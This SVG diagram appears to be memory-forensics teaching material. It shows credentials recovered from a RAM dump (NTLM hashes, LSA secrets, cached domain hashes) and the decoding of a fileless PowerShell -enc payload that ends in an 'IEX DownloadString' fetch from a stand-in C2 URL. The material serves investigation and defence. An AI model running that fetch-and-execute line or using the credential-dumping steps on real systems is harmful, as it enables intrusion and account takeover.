<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 400" font-family="'Chakra Petch','Segoe UI',Arial,sans-serif">
  <rect x="0" y="0" width="800" height="400" rx="12" fill="#0d121d" stroke="#263451"/>
  <text x="400" y="34" text-anchor="middle" font-size="17" font-weight="700" fill="#e3fffa">Credentials and a fileless payload in RAM</text>
  <text x="400" y="56" text-anchor="middle" font-size="12" fill="#6c7b93" font-family="'JetBrains Mono',monospace">two things only a memory dump holds: live secrets and a payload that never hit disk</text>

  <defs>
    <marker id="a" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto">
      <path d="M0,0 L7,3 L0,6 z" fill="#6c7b93"/>
    </marker>
  </defs>

  <!-- credentials lane -->
  <text x="24" y="82" font-size="11.5" fill="#fcee0a" font-family="'JetBrains Mono',monospace">1. credentials</text>

  <rect x="24" y="90" width="160" height="96" rx="7" fill="#111827" stroke="#00f0ff"/>
  <text x="104" y="130" text-anchor="middle" font-size="12.5" fill="#e3fffa">RAM structures</text>
  <text x="104" y="150" text-anchor="middle" font-size="10.5" fill="#9fb0c8" font-family="'JetBrains Mono',monospace">lsass / SAM / LSA</text>

  <rect x="210" y="90" width="566" height="96" rx="7" fill="#0b1518" stroke="#fcee0a"/>
  <text x="226" y="112" font-size="11.5" fill="#fcee0a" font-weight="700">credentials recovered</text>
  <g font-size="11" font-family="'JetBrains Mono',monospace" fill="#9fb0c8">
    <text x="226" y="132">hashdump   -&gt; NTLM hash, local accounts (pass-the-hash)</text>
    <text x="226" y="150">lsadump    -&gt; LSA secret: DefaultPassword in clear</text>
    <text x="226" y="168">cachedump  -&gt; MSCASHv2 domain hash (crack only)</text>
    <text x="226" y="182">memmap + pypykatz -&gt; tickets, sometimes plaintext</text>
  </g>
  <line x1="184" y1="138" x2="208" y2="138" stroke="#6c7b93" stroke-width="2" marker-end="url(#a)" fill="none"/>

  <!-- fileless lane -->
  <text x="24" y="216" font-size="11.5" fill="#ff2a6d" font-family="'JetBrains Mono',monospace">2. fileless -enc payload</text>

  <g font-size="11.5" text-anchor="middle">
    <rect x="24"  y="226" width="132" height="62" rx="7" fill="#111827" stroke="#263451"/>
    <text x="90"  y="252" fill="#e3fffa">windows.cmdline</text>
    <text x="90"  y="270" fill="#6c7b93" font-size="10">from the PEB</text>

    <rect x="172" y="226" width="132" height="62" rx="7" fill="#0b1518" stroke="#00f0ff" stroke-dasharray="5 4"/>
    <text x="238" y="252" fill="#00f0ff">-enc &lt;base64&gt;</text>
    <text x="238" y="270" fill="#9fb0c8" font-size="10">attacker string</text>

    <rect x="320" y="226" width="116" height="62" rx="7" fill="#111827" stroke="#263451"/>
    <text x="378" y="252" fill="#e3fffa">base64 -d</text>
    <text x="378" y="270" fill="#6c7b93" font-size="10">decode</text>

    <rect x="452" y="226" width="150" height="62" rx="7" fill="#111827" stroke="#263451"/>
    <text x="527" y="252" fill="#e3fffa">iconv UTF-16LE</text>
    <text x="527" y="270" fill="#6c7b93" font-size="10">drop null bytes</text>

    <rect x="618" y="226" width="158" height="62" rx="7" fill="#111827" stroke="#ff2a6d"/>
    <text x="697" y="250" fill="#ff2a6d" font-weight="700">IEX DownloadString</text>
    <text x="697" y="268" fill="#9fb0c8" font-size="10" font-family="'JetBrains Mono',monospace">http://C2/a.ps1</text>
  </g>

  <g stroke="#6c7b93" stroke-width="2" marker-end="url(#a)" fill="none">
    <line x1="156" y1="257" x2="170" y2="257"/>
    <line x1="304" y1="257" x2="318" y2="257"/>
    <line x1="436" y1="257" x2="450" y2="257"/>
    <line x1="602" y1="257" x2="616" y2="257"/>
  </g>

  <text x="400" y="330" text-anchor="middle" font-size="11" fill="#6c7b93">The C2 runs straight in memory, never on disk. strings -el catches DownloadString, IEX, AMSI.</text>
  <text x="400" y="352" text-anchor="middle" font-size="11" fill="#6c7b93">A recovered credential is evidence, not a ticket into another system.</text>
</svg>
